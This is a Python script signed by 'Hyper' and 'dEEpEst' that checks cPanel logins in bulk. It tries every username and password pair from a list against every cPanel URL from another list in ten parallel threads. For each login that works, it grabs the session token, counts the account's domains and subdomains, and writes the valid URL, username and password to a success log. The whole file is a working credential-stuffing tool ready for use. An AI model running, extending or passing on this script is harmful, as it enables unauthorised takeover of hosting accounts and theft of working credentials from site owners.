import requests, sys
import json
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import *
from itertools import product
requests.urllib3.disable_warnings()
init(autoreset=True)

print("Debug: Starting program...")

msg0 = "Coded By Hyper cPanel And Domain Number Checker\n"
for i in msg0:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(0.02)
msg0 = "Modified By dEEpEst\n"
for i in msg0:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(0.02)

filename_urls = input("Enter URL List: ")
filename_user_pass = input("Enter User/Pass List: ")
urls = []
user_pass = []

print(f"Debug: Loading URLs from {filename_urls}...")
try:
    with open(filename_urls, 'r', encoding="iso-8859-1") as f:
        for line in f:
            urls.append(line.strip())
except Exception as e:
    print(f"Debug: Error loading URLs: {e}")

print(f"Debug: Loading user/pass from {filename_user_pass}...")
try:
    with open(filename_user_pass, 'r', encoding="iso-8859-1") as f:
        for line in f:
            user_pass.append(line.strip().split('|'))
except Exception as e:
    print(f"Debug: Error loading user/pass: {e}")

# Create all combinations of URLs and Username/Password
combinations = list(product(urls, user_pass))

def get_domain_count(url, username, password):
    data_user_pass = {
        "user": username,
        "pass": password
    }
    s = requests.Session()
    try:
        resp = s.post(f"{url}/login/?login_only=1", data=data_user_pass, timeout=20, allow_redirects=True)
        login_resp = json.loads(resp.text)
        time.sleep(0.05)  
        cpsess_token = login_resp["security_token"][7:]
        resp = s.post(f"{url}/cpsess{cpsess_token}/execute/DomainInfo/domains_data", data={"return_https_redirect_status":"1"})
        domains_data = json.loads(resp.text)
        total_domain = 1
        if domains_data["status"] == 1:
            total_domain += len(domains_data["data"]["sub_domains"])
            total_domain += len(domains_data["data"]["addon_domains"])
        print(Fore.GREEN + f"[GOOD CPANEL] --> {url} | Domains: {total_domain}")
        open(f"SuccescPanels.log", "a").write(url + "|" + username + "|" + password + "\n")
        open(f"DomainNumberList.txt", "a", encoding="iso-8859-1").write(url + " --> Domains: " + str(total_domain) + "\n")
    except Exception:
        print(Fore.RED + f"Bad! Login: {url}")
        open(f"FailedcPanels.log", "a").write(url + "|" + username + "|" + password + "\n")
    finally:
        s.close()
        time.sleep(0.05)

with ThreadPoolExecutor(max_workers=10) as executor:
    for combo in combinations:
        url, (username, password) = combo
        executor.submit(get_domain_count, url, username, password)
input("Press Enter to exit...")
